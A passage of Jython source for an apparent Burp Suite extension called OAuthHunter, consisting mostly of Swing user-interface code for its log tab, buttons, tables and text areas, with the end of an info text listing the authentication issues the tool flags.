            "  - SAML RelayState redirect\n"
            "  - Auth cookie missing security flags (certain only)\n\n"
            "Note: Confirmation requests appear in Burp Proxy history\n"
            "tagged with OAuthHunter in the User-Agent.\n"
        )
        gbc.gridx, gbc.gridy      = 0, 3
        gbc.gridwidth, gbc.weightx = 2, 1.0
        gbc.weighty, gbc.fill      = 1.0, GridBagConstraints.BOTH
        p.add(JScrollPane(info), gbc)
        return p

    def _log_tab(self):
        e = self.ext
        p = JPanel(BorderLayout())
        p.setBackground(C_BG)

        area = JTextArea()
        area.setBackground(C_BG)
        area.setForeground(C_MUTED)
        area.setFont(Font("Monospaced", Font.PLAIN, 10))
        area.setEditable(False)
        area.setBorder(BorderFactory.createEmptyBorder(6, 8, 6, 8))
        e._log_area = area

        clear_btn = self._btn("Clear Log", C_MUTED)
        clear_btn.addActionListener(ClearLogAction(area))

        p.add(JScrollPane(area), BorderLayout.CENTER)
        p.add(clear_btn,         BorderLayout.SOUTH)
        return p

    def _btn(self, txt, fg=C_TEXT):
        b = JButton(txt)
        b.setFont(Font("Monospaced", Font.PLAIN, 11))
        b.setBackground(C_SURFACE)
        b.setForeground(fg)
        b.setFocusPainted(False)
        return b

    def _table(self, model):
        t = JTable(model)
        t.setBackground(C_SURFACE)
        t.setForeground(C_TEXT)
        t.setGridColor(C_BORDER)
        t.setSelectionBackground(C_ACCENT.darker())
        t.setFont(Font("Monospaced", Font.PLAIN, 11))
        t.getTableHeader().setBackground(C_BG)
        t.getTableHeader().setForeground(C_ACCENT)
        t.getTableHeader().setFont(Font("Monospaced", Font.BOLD, 11))
        t.setRowHeight(22)
        t.setAutoResizeMode(JTable.AUTO_RESIZE_OFF)
        return t

    def _textarea(self):
        a = JTextArea()
        a.setBackground(C_BG)
        a.setForeground(C_TEXT)
        a.setFont(Font("Monospaced", Font.PLAIN, 11))
        a.setEditable(False)
        a.setLineWrap(True)
        a.setWrapStyleWord(True)
        a.setBorder(BorderFactory.createEmptyBorder(8, 10, 8, 10))
        return a
